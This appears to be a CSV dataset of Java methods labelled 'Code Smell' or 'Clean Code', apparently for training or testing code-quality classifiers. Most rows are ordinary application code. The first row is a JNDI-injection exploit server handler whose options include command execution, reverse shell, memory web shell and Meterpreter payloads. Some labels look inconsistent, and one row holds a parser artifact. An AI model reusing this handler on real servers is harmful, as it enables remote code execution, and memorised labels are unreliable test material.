text,label,text_label
"@Override public void sendResult(InMemoryInterceptedSearchResult result,String base) throws Exception {
  System.out.println(""[+] Sending LDAP ResourceRef result for "" + base + "" with javax.el.ELProcessor payload"");
  Entry e=new Entry(base);
  e.addAttribute(""javaClassName"",""java.lang.String"");
  ResourceRef ref=new ResourceRef(""javax.el.ELProcessor"",null,"""","""",true,""org.apache.naming.factory.BeanFactory"",null);
  ref.add(new StringRefAddr(""forceString"",""x=eval""));
  TomcatBypassHelper helper=new TomcatBypassHelper();
  String code=null;
switch (type) {
case dnslog:
    code=helper.getDnsRequestCode(params[0]);
  break;
case command:
code=helper.getExecCode(params[0]);
break;
case reverseshell:
code=helper.getReverseShellCode(params[0],params[1]);
break;
case tomcatecho:
code=helper.injectTomcatEcho();
break;
case springecho:
code=helper.injectSpringEcho();
break;
case tomcatmemshell1:
code=helper.injectTomcatMemshell1();
break;
case tomcatmemshell2:
code=helper.injectTomcatMemshell2();
break;
case springmemshell:
code=helper.injectSpringMemshell();
break;
case tomcatmemshell3:
code=helper.injectmemshell3();
break;
case issuccess:
code=helper.injectSuccess();
break;
case godzillamemshell:
code=helper.injectGodzilla();
break;
case meterpreter:
code=helper.injectMeterpreter();
break;
}
String finalPayload=payloadTemplate.replace(""{replacement}"",code);
ref.add(new StringRefAddr(""x"",finalPayload));
e.addAttribute(""javaSerializedData"",Util.serialize(ref));
result.sendSearchEntry(e);
result.setResult(new LDAPResult(0,ResultCode.SUCCESS));
}",1,Code Smell
"/** 
 * @param majorVersion The client manifest major version.
 * @param minorVersion The client manifest minor version.
 * @param timescale The timescale of the media as the number of units that pass in one second.
 * @param duration The overall presentation duration in units of the timescale attribute, or 0 ifthe duration is unknown.
 * @param dvrWindowLength The length of the trailing window in units of the timescale attribute,or 0 if this attribute is unspecified or not applicable.
 * @param lookAheadCount The number of fragments in a lookahead, or {@link #UNSET_LOOKAHEAD} ifthis attribute is unspecified or not applicable.
 * @param isLive True if the manifest describes a live presentation still in progress. Falseotherwise.
 * @param protectionElement Content protection information, or null if the content is notprotected.
 * @param streamElements The contained stream elements.
 */
public SsManifest(int majorVersion,int minorVersion,long timescale,long duration,long dvrWindowLength,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this(majorVersion,minorVersion,duration == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(duration,C.MICROS_PER_SECOND,timescale),dvrWindowLength == 0 ? C.TIME_UNSET : Util.scaleLargeTimestamp(dvrWindowLength,C.MICROS_PER_SECOND,timescale),lookAheadCount,isLive,protectionElement,streamElements);
}
private SsManifest(int majorVersion,int minorVersion,long durationUs,long dvrWindowLengthUs,int lookAheadCount,boolean isLive,ProtectionElement protectionElement,StreamElement[] streamElements){
  this.majorVersion=majorVersion;
  this.minorVersion=minorVersion;
  this.durationUs=durationUs;
  this.dvrWindowLengthUs=dvrWindowLengthUs;
  this.lookAheadCount=lookAheadCount;
  this.isLive=isLive;
  this.protectionElement=protectionElement;
  this.streamElements=streamElements;
}",0,Clean Code
"private static void validateNoCyclesStep(Set<ClassQName> alreadySeen,MethodInfo method,boolean includeHolder){
  Set<ClassQName> outgoing=new HashSet<>();
  if (includeHolder) {
    outgoing.add(new ClassQName(method.getDeclaringClass()));
  }
  for (  ParameterInfo ppi : method.getParameters()) {
    outgoing.add(new ClassQName(ppi.getType()));
  }
  if (outgoing.isEmpty()) {
    return;
  }
  Set<ClassQName> currentSeen=new HashSet<>();
  currentSeen.addAll(alreadySeen);
  for (  ClassQName ci : outgoing) {
    if (!currentSeen.add(ci)) {
      throw new GenerationException(""@"" + State.class.getSimpleName() + "" dependency cycle is detected: ""+ ci.ci.getQualifiedName()+ "" ""+ currentSeen,method);
    }
    Set<ClassQName> nextSeen=new HashSet<>();
    nextSeen.addAll(alreadySeen);
    nextSeen.add(ci);
    for (    MethodInfo mi : BenchmarkGeneratorUtils.getAllMethods(ci.ci)) {
      if (mi.getAnnotation(Setup.class) != null || mi.getAnnotation(TearDown.class) != null) {
        validateNoCyclesStep(nextSeen,mi,false);
      }
    }
  }
}
",1,Code Smell
"public void setTextAndValueAndTypeAndThumb(String text,String value,String type,String thumb,int resId,boolean divider){
  nameTextView.setText(text);
  dateTextView.setText(value);
  if (type != null) {
    extTextView.setVisibility(VISIBLE);
    extTextView.setText(type.toLowerCase());
  }
 else {
    extTextView.setVisibility(INVISIBLE);
  }
  needDivider=divider;
  if (resId == 0) {
    placeholderImageView.setImageResource(AndroidUtilities.getThumbForNameOrMime(text,type,false));
    placeholderImageView.setVisibility(VISIBLE);
  }
 else {
    placeholderImageView.setVisibility(INVISIBLE);
  }
  if (thumb != null || resId != 0) {
    if (thumb != null) {
      if (viewType != VIEW_TYPE_CACHE) {
        thumbImageView.setImage(thumb,""42_42"",null);
      }
    }
 else {
      Drawable drawable=Theme.createCircleDrawableWithIcon(AndroidUtilities.dp(42),resId);
      int iconKey;
      int backKey;
      if (resId == R.drawable.files_storage) {
        backKey=Theme.key_chat_attachLocationBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_gallery) {
        backKey=Theme.key_chat_attachContactBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_music) {
        backKey=Theme.key_chat_attachAudioBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else       if (resId == R.drawable.files_internal) {
        backKey=Theme.key_chat_attachGalleryBackground;
        iconKey=Theme.key_chat_attachIcon;
      }
 else {
        backKey=Theme.key_files_folderIconBackground;
        iconKey=Theme.key_files_folderIcon;
      }
      Theme.setCombinedDrawableColor(drawable,getThemedColor(backKey),false);
      Theme.setCombinedDrawableColor(drawable,getThemedColor(iconKey),true);
      thumbImageView.setImageDrawable(drawable);
    }
    thumbImageView.setVisibility(VISIBLE);
  }
 else {
    extTextView.setAlpha(1.0f);
    placeholderImageView.setAlpha(1.0f);
    if (viewType != VIEW_TYPE_CACHE) {
      thumbImageView.setImageBitmap(null);
      thumbImageView.setVisibility(INVISIBLE);
    }
  }
  setWillNotDraw(!needDivider);
}",0,Clean Code
"private boolean builtinIgnoreInvokeInstruction(MethodVisitor m,InvokeInstruction instruction,CallGraphEntry callGraphEntry){
  final String calleeMethod=callGraphEntry.getCalleeMethod();
  final String calleeClass=callGraphEntry.getCalleeClazz();
  if (ignore.ignoreClassInnerCall() && m.callerClass.equals(calleeClass)) {
    return true;
  }
  if (!callGraphEntry.getCalleeClazz().contains(""."")) {
    return true;
  }
  if (calleeMethod.equals(methodConstructor) || calleeMethod.equals(methodStaticInit)) {
    return true;
  }
  if (calleeMethod.contains(""$"") || calleeClass.contains(""$"")) {
    return true;
  }
  if (instruction == null) {
    return false;
  }
  int args=instruction.getArgumentTypes(m.constantPoolGen).length;
  if (calleeMethod.startsWith(""get"") && args == 0) {
    log.debug(""getter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  if (calleeMethod.startsWith(""set"") && args == 1) {
    log.debug(""setter ignored: {}.{} -> {}.{}"",m.callerClass,m.callerMethod,calleeClass,calleeMethod);
    return true;
  }
  return false;
}",1,Code Smell
"private void dropTable(String tableName,DialectProperties dialectProperties,Long dataSourceId){
  DropParam dropParam=DropParam.builder().dataSourceId(dataSourceId).databaseName(dialectProperties.getDatabaseName()).tableName(dialectProperties.toCase(tableName)).build();
  tableService.drop(dropParam);
  TablePageQueryParam tablePageQueryParam=new TablePageQueryParam();
  tablePageQueryParam.setDataSourceId(dataSourceId);
  tablePageQueryParam.setDatabaseName(dialectProperties.getDatabaseName());
  tablePageQueryParam.setTableName(dialectProperties.toCase(tableName));
  List<Table> tableList=tableService.pageQuery(tablePageQueryParam,TableSelector.builder().columnList(Boolean.TRUE).indexList(Boolean.TRUE).build()).getData();
  log.info(""After deleting the table, the data returns {}"",JSON.toJSONString(tableList));
  Assertions.assertEquals(0L,tableList.size(),""Query table structure failed"");
}
@Test @Order(Integer.MAX_VALUE) public void dropTable(){
  for (  DialectProperties dialectProperties : dialectPropertiesList) {
    try {
      String dbTypeEnum=dialectProperties.getDbType();
      Long dataSourceId=TestUtils.nextLong();
      Long consoleId=TestUtils.nextLong();
      DataSourcePreConnectParam dataSourceCreateParam=new DataSourcePreConnectParam();
      dataSourceCreateParam.setType(dbTypeEnum);
      dataSourceCreateParam.setUrl(dialectProperties.getUrl());
      dataSourceCreateParam.setUser(dialectProperties.getUsername());
      dataSourceCreateParam.setPassword(dialectProperties.getPassword());
      dataSourceService.preConnect(dataSourceCreateParam);
      ConsoleConnectParam consoleCreateParam=new ConsoleConnectParam();
      consoleCreateParam.setDataSourceId(dataSourceId);
      consoleCreateParam.setConsoleId(consoleId);
      consoleCreateParam.setDatabaseName(dialectProperties.getDatabaseName());
      consoleService.createConsole(consoleCreateParam);
      DlExecuteParam templateQueryParam=new DlExecuteParam();
      templateQueryParam.setConsoleId(consoleId);
      templateQueryParam.setDataSourceId(dataSourceId);
      templateQueryParam.setSql(dialectProperties.getDropTableSql(TABLE_NAME));
      dlTemplateService.execute(templateQueryParam);
    }
 catch (    Exception e) {
      log.warn(""Failed to delete table structure."",e);
    }
  }
}",0,Clean Code
"private void createButtons(JPanel topPanel){
  final JPanel buttonPanel=new JPanel(new GridBagLayout());
  this.saveButton=new JButton(""Save"");
  this.saveButton.setMnemonic(KeyEvent.VK_S);
  final GridBagConstraints saveConstraints=createButtonConstraints(0,0);
  this.saveButton.addActionListener(e -> saveConfigValues());
  buttonPanel.add(this.saveButton,saveConstraints);
  this.cancelButton=new JButton(""Cancel"");
  this.cancelButton.setMnemonic(KeyEvent.VK_C);
  this.cancelButton.addActionListener(e -> {
    loadSavedFieldValues();
    enableButtons(false);
  }
);
  final GridBagConstraints cancelConstraints=createButtonConstraints(1,5);
  buttonPanel.add(this.cancelButton,cancelConstraints);
  final GridBagConstraints buttonPanelConstraints=new GridBagConstraints();
  buttonPanelConstraints.gridx=1;
  buttonPanelConstraints.gridwidth=2;
  buttonPanelConstraints.gridy=this.configParameters.size() + 1;
  buttonPanelConstraints.weightx=0.01;
  buttonPanelConstraints.fill=GridBagConstraints.HORIZONTAL;
  topPanel.add(buttonPanel,buttonPanelConstraints);
}",0,Clean Code
"public int minLevelRequired(){
  int lvl=0;
  if (currentReplyColor != selectedReplyColor) {
    MessagesController.PeerColors peerColors=getMessagesController().peerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedReplyColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentReplyEmoji != selectedReplyEmoji) {
    lvl=Math.max(lvl,getMessagesController().channelBgIconLevelMin);
  }
  if (currentProfileColor != selectedProfileColor) {
    MessagesController.PeerColors peerColors=getMessagesController().profilePeerColors;
    MessagesController.PeerColor peerColor=peerColors == null ? null : peerColors.getColor(selectedProfileColor);
    if (peerColor != null) {
      lvl=Math.max(lvl,peerColor.getLvl(isGroup));
    }
  }
  if (currentProfileEmoji != selectedProfileEmoji) {
    lvl=Math.max(lvl,getProfileIconLevelMin());
  }
  if (!DialogObject.emojiStatusesEqual(currentStatusEmoji,selectedStatusEmoji)) {
    lvl=Math.max(lvl,getEmojiStatusLevelMin());
  }
  if (!ChatThemeController.wallpaperEquals(currentWallpaper,selectedWallpaper)) {
    lvl=Math.max(lvl,getWallpaperLevelMin());
  }
  return lvl;
}",0,Clean Code
"public static String formatDistance(float distance,int type){
  return formatDistance(distance,type,null);
}
!org.eclipse.jdt.core.dom.MethodDeclaration@7b4183e3",0,Clean Code
"public static List<ApplicationInfo> getInstalledApplications(PackageManager packageManager){
  if (packageManager == null) {
    return Collections.emptyList();
  }
  @SuppressLint(""WrongConstant"") List<ApplicationInfo> installedApplications=packageManager.getInstalledApplications(PackageManager.GET_UNINSTALLED_PACKAGES | PackageManager.GET_DISABLED_COMPONENTS);
  int userApp=0;
  for (  ApplicationInfo installedApplication : installedApplications) {
    if ((installedApplication.flags & ApplicationInfo.FLAG_SYSTEM) == 0) {
      if (userApp++ > 3) {
        return installedApplications;
      }
    }
  }
  List<ApplicationInfo> applicationInfos=new ArrayList<>();
  for (int uid=0; uid <= Process.LAST_APPLICATION_UID; uid++) {
    String[] packagesForUid=packageManager.getPackagesForUid(uid);
    if (packagesForUid == null || packagesForUid.length == 0) {
      continue;
    }
    for (    String pkg : packagesForUid) {
      try {
        ApplicationInfo applicationInfo=packageManager.getApplicationInfo(pkg,0);
        applicationInfos.add(applicationInfo);
      }
 catch (      PackageManager.NameNotFoundException ignored) {
      }
    }
  }
  return applicationInfos;
}",1,Code Smell
"private ComponentPackageDOExample buildExample(ComponentPackageQueryCondition condition){
  ComponentPackageDOExample example=new ComponentPackageDOExample();
  ComponentPackageDOExample.Criteria criteria=example.createCriteria();
  if (Objects.nonNull(condition.getId())) {
    criteria.andIdEqualTo(condition.getId());
  }
  if (CollectionUtils.isNotEmpty(condition.getIdList())) {
    criteria.andIdIn(condition.getIdList());
  }
  if (StringUtils.isNotBlank(condition.getAppId())) {
    criteria.andAppIdEqualTo(condition.getAppId());
  }
  if (StringUtils.isNotBlank(condition.getComponentType())) {
    criteria.andComponentTypeEqualTo(condition.getComponentType());
  }
  if (StringUtils.isNotBlank(condition.getComponentName())) {
    criteria.andComponentNameEqualTo(condition.getComponentName());
  }
  if (StringUtils.isNotBlank(condition.getPackageCreator())) {
    criteria.andPackageCreatorEqualTo(condition.getPackageCreator());
  }
  if (StringUtils.isNotBlank(condition.getPackageVersion())) {
    criteria.andPackageVersionEqualTo(condition.getPackageVersion());
  }
  if (StringUtils.isNotBlank(condition.getNamespaceId())) {
    criteria.andNamespaceIdEqualTo(condition.getNamespaceId());
  }
  if (StringUtils.isNotBlank(condition.getStageId())) {
    criteria.andStageIdEqualTo(condition.getStageId());
  }
  return example;
}
",0,Clean Code
"@Override public void clearSearch(){
  mSearchQuery=null;
  for (  VideoGroupObjectAdapter adapter : mSearchGroupAdapters.values()) {
    adapter.clear();
  }
  mSearchGroupAdapters.clear();
  ObjectAdapter resultsAdapter=getResultsAdapter();
  if (resultsAdapter == null) {
    return;
  }
  int size=resultsAdapter.size();
  int index=0;
  for (int i=0; i < size; i++) {
    Object row=resultsAdapter.get(index);
    if (row instanceof ListRow && ((ListRow)row).getAdapter() instanceof VideoGroupObjectAdapter) {
      detachAdapter(index);
    }
 else {
      index++;
    }
  }
}",0,Clean Code
"@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}
@Override protected void onDraw(Canvas canvas){
  if (isInEditMode() || tabCount == 0) {
    super.onDraw(canvas);
    return;
  }
  final int height=getHeight();
  if (underlineHeight != 0) {
    rectPaint.setColor(underlineColor);
    AndroidUtilities.rectTmp.set(0,height - underlineHeight,tabsContainer.getWidth(),height);
    canvas.drawRoundRect(AndroidUtilities.rectTmp,underlineHeight / 2f,underlineHeight / 2f,rectPaint);
  }
  View currentTab=tabsContainer.getChildAt(currentPosition);
  if (currentTab != null) {
    float lineLeft=currentTab.getLeft() + currentTab.getPaddingLeft();
    float lineRight=currentTab.getRight() - currentTab.getPaddingRight();
    if (currentPositionOffset > 0f && currentPosition < tabCount - 1) {
      View nextTab=tabsContainer.getChildAt(currentPosition + 1);
      final float nextTabLeft=nextTab.getLeft() + nextTab.getPaddingLeft();
      final float nextTabRight=nextTab.getRight() - nextTab.getPaddingRight();
      lineLeft=(currentPositionOffset * nextTabLeft + (1f - currentPositionOffset) * lineLeft);
      lineRight=(currentPositionOffset * nextTabRight + (1f - currentPositionOffset) * lineRight);
      lineLeftAnimated.set(lineLeft,true);
      lineRightAnimated.set(lineRight,true);
      if (currentTab instanceof TextTab) {
        ((TextTab)currentTab).setSelectedProgress(1f - currentPositionOffset);
      }
      if (nextTab instanceof TextTab) {
        ((TextTab)nextTab).setSelectedProgress(currentPositionOffset);
      }
    }
 else {
      lineLeft=lineLeftAnimated.set(lineLeft);
      lineRight=lineRightAnimated.set(lineRight);
    }
    if (indicatorHeight != 0) {
      rectPaint.setColor(indicatorColor);
      AndroidUtilities.rectTmp.set(lineLeft - AndroidUtilities.dp(12),AndroidUtilities.dp(6),lineRight + AndroidUtilities.dp(12),height - AndroidUtilities.dp(6));
      canvas.drawRoundRect(AndroidUtilities.rectTmp,AndroidUtilities.rectTmp.height() / 2f,AndroidUtilities.rectTmp.height() / 2f,rectPaint);
    }
  }
  super.onDraw(canvas);
}
@Override protected void onDraw(Canvas canvas){
  super.onDraw(canvas);
  if (pager.getAdapter() instanceof IconTabProvider) {
    ((IconTabProvider)pager.getAdapter()).customOnDraw(canvas,this,position);
  }
}",1,Code Smell
"/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
/** 
 * Selects a Row and perform an optional task on the Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
}
/** 
 * Selects a Row.
 */
public void setSelectedPosition(int rowPosition,boolean smooth){
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth,final Presenter.ViewHolderTask rowHolderTask){
  getFragment().setSelectedPosition(rowPosition,smooth,rowHolderTask);
}
@Override public void setSelectedPosition(int rowPosition,boolean smooth){
  getFragment().setSelectedPosition(rowPosition,smooth);
}
",0,Clean Code
"public void drawDividers(Canvas canvas,int w,int h){
  if (mDividerPaint == null && (mTopDividerHeight > 0 || mBottomDividerHeight > 0 || mLeftDividerWidth > 0 || mRightDividerWidth > 0)) {
    mDividerPaint=new Paint();
  }
  if (mTopDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mTopDividerHeight);
    mDividerPaint.setColor(mTopDividerColor);
    if (mTopDividerAlpha < 255) {
      mDividerPaint.setAlpha(mTopDividerAlpha);
    }
    float y=mTopDividerHeight * 1f / 2;
    canvas.drawLine(mTopDividerInsetLeft,y,w - mTopDividerInsetRight,y,mDividerPaint);
  }
  if (mBottomDividerHeight > 0) {
    mDividerPaint.setStrokeWidth(mBottomDividerHeight);
    mDividerPaint.setColor(mBottomDividerColor);
    if (mBottomDividerAlpha < 255) {
      mDividerPaint.setAlpha(mBottomDividerAlpha);
    }
    float y=(float)Math.floor(h - mBottomDividerHeight * 1f / 2);
    canvas.drawLine(mBottomDividerInsetLeft,y,w - mBottomDividerInsetRight,y,mDividerPaint);
  }
  if (mLeftDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mLeftDividerWidth);
    mDividerPaint.setColor(mLeftDividerColor);
    if (mLeftDividerAlpha < 255) {
      mDividerPaint.setAlpha(mLeftDividerAlpha);
    }
    canvas.drawLine(0,mLeftDividerInsetTop,0,h - mLeftDividerInsetBottom,mDividerPaint);
  }
  if (mRightDividerWidth > 0) {
    mDividerPaint.setStrokeWidth(mRightDividerWidth);
    mDividerPaint.setColor(mRightDividerColor);
    if (mRightDividerAlpha < 255) {
      mDividerPaint.setAlpha(mRightDividerAlpha);
    }
    canvas.drawLine(w,mRightDividerInsetTop,w,h - mRightDividerInsetBottom,mDividerPaint);
  }
}",0,Clean Code
"public static Drawable getOrCreate(Drawable backgroundDrawable,TLRPC.WallPaper wallpaper,boolean themeIsDark){
  if (backgroundDrawable instanceof ChatBackgroundDrawable) {
    ChatBackgroundDrawable chatBackgroundDrawable=(ChatBackgroundDrawable)backgroundDrawable;
    if (wallpaper.uploadingImage != null) {
      if (wallpaper.uploadingImage.equals(chatBackgroundDrawable.wallpaper.uploadingImage)) {
        if (wallpaper.settings != null && chatBackgroundDrawable.wallpaper.settings != null && wallpaper.settings.intensity > 0) {
          if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
            return chatBackgroundDrawable;
          }
        }
 else {
          return chatBackgroundDrawable;
        }
      }
    }
 else     if (wallpaper.id == chatBackgroundDrawable.wallpaper.id && TextUtils.equals(hash(wallpaper.settings),hash(chatBackgroundDrawable.wallpaper.settings))) {
      if (wallpaper.document != null && !wallpaper.pattern && wallpaper.settings != null && wallpaper.settings.intensity > 0) {
        if (chatBackgroundDrawable.themeIsDark == themeIsDark) {
          return chatBackgroundDrawable;
        }
      }
 else {
        return chatBackgroundDrawable;
      }
    }
  }
  return new ChatBackgroundDrawable(wallpaper,themeIsDark,false);
}",0,Clean Code
"public static List<Condition> geneEruptSearchCondition(EruptModel eruptModel,List<Condition> searchCondition){
  checkEruptSearchNotnull(eruptModel,searchCondition);
  List<Condition> legalConditions=new ArrayList<>();
  if (null != searchCondition) {
    for (    Condition condition : searchCondition) {
      EruptFieldModel eruptFieldModel=eruptModel.getEruptFieldMap().get(condition.getKey());
      if (null != eruptFieldModel) {
        Edit edit=eruptFieldModel.getEruptField().edit();
        EditTypeSearch editTypeSearch=AnnotationProcess.getEditTypeSearch(edit.type());
        if (null != editTypeSearch && editTypeSearch.value()) {
          if (edit.search().value() && null != condition.getValue()) {
            if (condition.getValue() instanceof Collection) {
              Collection<?> collection=(Collection<?>)condition.getValue();
              if (collection.size() == 0) {
                continue;
              }
            }
            if (edit.search().vague()) {
              condition.setExpression(editTypeSearch.vagueMethod());
            }
 else {
              condition.setExpression(QueryExpression.EQ);
            }
            legalConditions.add(condition);
          }
        }
      }
    }
  }
  return legalConditions;
}",0,Clean Code
"private AndroidBatteryInfo parseRawResultFile(File rawFile,String packageName,Logger logger){
  if (!rawFile.isFile()) {
    return null;
  }
  AndroidBatteryInfo batteryInfo=new AndroidBatteryInfo();
  float totalUsage=0.0f;
  float appUsage=0.0f;
  int mode=1;
  String uid=null;
  boolean isCalculatedTotalUsage=false;
  try (FileInputStream stream=new FileInputStream(rawFile);InputStreamReader reader=new InputStreamReader(stream,StandardCharsets.UTF_8);BufferedReader in=new BufferedReader(reader)){
    List<String> contents=new ArrayList<>();
    String inputLine;
    while ((inputLine=in.readLine()) != null) {
      inputLine=inputLine.trim().toLowerCase();
      contents.add(inputLine);
    }
    for (    String line : contents) {
      if (Pattern.matches(""u0.*:"",line)) {
        uid=line.split("":"")[0];
      }
    }
    if (uid == null) {
      logger.error(String.format(""Could not parse the battery usage of %s in battery info file: %s"",packageName,rawFile.getAbsolutePath()));
      return null;
    }
    for (    String line : contents) {
      if (mode == 1) {
        if (Pattern.matches(""capacity:.*computed drain:.*"",line)) {
          totalUsage=parseFloat(line.split(""computed drain: "")[1].split("","")[0],line,logger);
          if (totalUsage == 0.0) {
            mode=2;
          }
        }
      }
 else {
        if (Pattern.matches("".*global.*"",line)) {
          isCalculatedTotalUsage=true;
          continue;
        }
        if (isCalculatedTotalUsage && line.startsWith(""uid"")) {
          isCalculatedTotalUsage=false;
        }
        if (isCalculatedTotalUsage) {
          totalUsage+=parseFloat(line.split("" "")[1].trim(),line,logger);
        }
      }
      if (Pattern.matches(""uid "" + uid + "":.*"",line)) {
        appUsage=parseFloat(line.split("": "")[1].split("" "")[0],line,logger);
        batteryInfo.setAppUsage(appUsage);
        batteryInfo.setRatio(appUsage / totalUsage);
        batteryInfo.setCpu(parseAppDetails(line,""cpu="",logger));
        batteryInfo.setSystemService(parseAppDetails(line,""system_services="",logger));
        batteryInfo.setScreen(parseAppDetails(line,""screen="",logger));
        batteryInfo.setWakeLock(parseAppDetails(line,""wakelock="",logger));
        batteryInfo.setWifi(parseAppDetails(line,""wifi="",logger));
      }
      batteryInfo.setTotal(totalUsage);
    }
  }
 catch (  IOException e) {
    logger.info(""Failed to parse the battery info file: "" + rawFile.getAbsolutePath());
    return null;
  }
  return batteryInfo;
}",1,Code Smell
"protected void buildExpression(String expression) throws ParseException {
  expressionParsed=true;
  try {
    if (seconds == null) {
      seconds=new TreeSet<Integer>();
    }
    if (minutes == null) {
      minutes=new TreeSet<Integer>();
    }
    if (hours == null) {
      hours=new TreeSet<Integer>();
    }
    if (daysOfMonth == null) {
      daysOfMonth=new TreeSet<Integer>();
    }
    if (months == null) {
      months=new TreeSet<Integer>();
    }
    if (daysOfWeek == null) {
      daysOfWeek=new TreeSet<Integer>();
    }
    if (years == null) {
      years=new TreeSet<Integer>();
    }
    int exprOn=SECOND;
    StringTokenizer exprsTok=new StringTokenizer(expression,"" \t"",false);
    while (exprsTok.hasMoreTokens() && exprOn <= YEAR) {
      String expr=exprsTok.nextToken().trim();
      if (exprOn == DAY_OF_MONTH && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' and 'LW' with other days of the month is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('L') != -1 && expr.length() > 1 && expr.contains("","")) {
        throw new ParseException(""Support for specifying 'L' with other days of the week is not implemented"",-1);
      }
      if (exprOn == DAY_OF_WEEK && expr.indexOf('#') != -1 && expr.indexOf('#',expr.indexOf('#') + 1) != -1) {
        throw new ParseException(""Support for specifying multiple \""nth\"" days is not implemented."",-1);
      }
      StringTokenizer vTok=new StringTokenizer(expr,"","");
      while (vTok.hasMoreTokens()) {
        String v=vTok.nextToken();
        storeExpressionVals(0,v,exprOn);
      }
      exprOn++;
    }
    if (exprOn <= DAY_OF_WEEK) {
      throw new ParseException(""Unexpected end of expression."",expression.length());
    }
    if (exprOn <= YEAR) {
      storeExpressionVals(0,""*"",YEAR);
    }
    TreeSet<Integer> dow=getSet(DAY_OF_WEEK);
    TreeSet<Integer> dom=getSet(DAY_OF_MONTH);
    boolean dayOfMSpec=!dom.contains(NO_SPEC);
    boolean dayOfWSpec=!dow.contains(NO_SPEC);
    if (!dayOfMSpec || dayOfWSpec) {
      if (!dayOfWSpec || dayOfMSpec) {
        throw new ParseException(""Support for specifying both a day-of-week AND a day-of-month parameter is not implemented."",0);
      }
    }
  }
 catch (  ParseException pe) {
    throw pe;
  }
catch (  Exception e) {
    throw new ParseException(""Illegal cron expression format ("" + e.toString() + "")"",0);
  }
}",0,Clean Code
"@NonNull public Path findOrCreateFile(@NonNull String displayName,@Nullable String mimeType) throws IOException {
  displayName=Paths.sanitize(displayName,true);
  if (displayName == null) {
    throw new IOException(""Empty display name."");
  }
  if (displayName.indexOf(File.separatorChar) != -1) {
    throw new IllegalArgumentException(""Display name contains file separator."");
  }
  DocumentFile documentFile=getRealDocumentFile(this.documentFile);
  if (!documentFile.isDirectory()) {
    throw new IOException(""Current file is not a directory."");
  }
  String extension=null;
  if (mimeType != null) {
    extension=MimeTypeMap.getSingleton().getExtensionFromMimeType(mimeType);
  }
 else   mimeType=DEFAULT_MIME;
  String nameWithExtension=displayName + (extension != null ? ""."" + extension : """");
  checkVfs(Paths.appendPathSegment(documentFile.getUri(),nameWithExtension));
  DocumentFile file=documentFile.findFile(displayName);
  if (file != null) {
    if (file.isDirectory()) {
      throw new IOException(""Directory cannot be converted to file"");
    }
    return new PathImpl(context,file);
  }
  file=documentFile.createFile(mimeType,displayName);
  if (file == null) {
    throw new IOException(""Could not create "" + documentFile.getUri() + File.separatorChar+ nameWithExtension+ "" with type ""+ mimeType);
  }
  return new PathImpl(context,file);
}",1,Code Smell
